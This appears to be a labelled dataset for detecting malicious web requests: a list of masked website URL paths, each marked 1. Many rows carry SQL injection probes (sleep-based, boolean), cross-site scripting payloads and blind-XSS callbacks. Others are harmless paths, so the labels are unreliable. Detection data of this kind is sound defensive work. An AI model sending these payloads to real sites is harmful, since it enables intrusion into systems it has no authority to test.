sentences	labels
ywzzq/*******/diary/new/submit.php 	 1
xwzx/****/2020_jtyw/ and 1>1 	 1
e/******/addinfo.php 	 1
images//***/n3znjzz1/xhr_send?t=1632346140281 	 1
pic/***/11/07/71/11077159_769451.jpg 	 1
nbfw/****/job/lib/ap_resume_position.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects) 	 1
newscenter/******/2020/04/24/javascript:void(0); 	 1
index/****/index.shtml/"><script>alert(15)</script> 	 1
system/********/code/datainput.jsp?owner=') and 3887=3887 and ('1'='1 	 1
module/*****/ckplayer/ckplayer.js/<img src="javascript:alert(7570)">?_=1630312617878 	 1
video/*****/edit.php?title="">pt>alert(777);< /script>pt> 	 1
zwgk/****/bmjs/zzqjcyxt/xxqrmjcy/\"javascript:void(0)\" 	 1
rlzy/****/202010/t20201009_254278.html" and "x"="y 	 1
jsearchfront/********/http://bxss.me/t/xss.html? 	 1
qhly/******/2006/09/23/javascript:dozoom(9) 	 1
xxgk/******/tjj/zfxxgkml'""()&%<acx><script >khwe(9675)</script>_2127/hygq_2064/list.html 	 1
zwgk/*******/fdzdgknr' and 2*3*8=6*8 and 'uue2'='uue2.htm 	 1
col/******/'""()&%<acx><script >rgmp(9630)</script>.html 	 1
zwgk/****/bmjs/rmtt/\"javascript:void(0)\" 	 1
xwzx/****/if(now()=sysdate(),sleep(15),0)_mtgz/202107/t20210712_310551.html 	 1
newscenter/******/more/javascript:alert(1850)/0045/217000000000000_00004535.shtml 	 1
system/********/js' and 2*3*8=6*8 and 'uejk'='uejk/newcalendar/config.js 	 1
news/*******/:'""()&%<acx><script >aha2(9874)</script> 	 1
en/********/electricequipment/201505/t20150513_60359.html 	 1
zfld/******/2021/12/19/javascript:window.print() 	 1
z/191211-8/http://*******/t/xss.html? 	 1
synr/*******/booking/eventlist.php?serviceid=1337" onmouseover="alert(777) 	 1
jsearchfront/********/jcse/110105008056111/16/images/plugin/'""()&%<acx><script >1itm(9683)</script>/hzrecorder.js 	 1
pic/****/job/lib/ap_resume_workcity.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects1) 	 1
lcgg/********/javascript:void(0); 	 1
z/210909-2/*****/753947'""()&%<acx><script >u4vx(9369)</script>c86c4981426850a2ab09d4614a.css 	 1
was5/***/search?page=2&channelid=253477&searchword=1%') or 2831=2831 /*&keyword=1&orderby=-docreltime&perpage=15&outlinepage=10 	 1
zwgk/****/\"javascript:void(0)\" 	 1
xwdt/****/0""xor(if(now()=sysdate(),sleep(12),0))xor""z.htm 	 1
fxgg/********/javascript:void(0); 	 1
zwgk/******/fdzdgknr/qtfdxx/qzqd/http://bxss.me/t/xss.html? 	 1
templates/********/index.aspx?nodeid=394);select pg_sleep(5)-- 	 1
if(now()=sysdate(),sleep(12),0)/******/ncwywfgz/wzs/hsbq/xmb_gzdxb.htm 	 1
vc/**/widgets/hanweb/placeholder/css/placeholder"" and 2*3*8=6*8 and ""nzi0""=""nzi0.css 	 1
newscenter/******/2021/10/01/javascript:window.print() 	 1
module/*****/ckplayer/ckplayer.js/"><script>alert(395)</script>?_=1630311391750 	 1
e/******/viewclick/?addclick='""()&%<acx><script >qon1(9202)</script>&classid=168&id=10226 	 1
system/********/code/datainput.jsp?owner=%' or 4144=9455  	 1
newscenter/******/2007/11/02/002244239.shtml 	 1
zwgk/****/bmjs/zzqfyxt/xqqrmfy/\"javascript:void(0)\" 	 1
system/if(now()=sysdate(),sleep(12),0)/**/ajax.js 	 1
css/data:image/svg xml;charset=utf-8,<svg xmlns='http://**********/2000/svg' viewbox='0 0 27 44'><path d='m27,22l27,22l5,44l-2.1-2.1l22.8,22l2.9,2.1l5,0l27,22l27,22z' fill='#007aff'/></svg> 	 1
qtyz/******/common/signin.aspx?tbemailaddress=alert(777)returnurl=/******/common/default.aspx 	 1
images/**********/tabledata.jsp?server=localhost&db=mysql&table=""/>alert(777); 	 1
css/*******/gvideos.php?gid=1 and 1=2 	 1
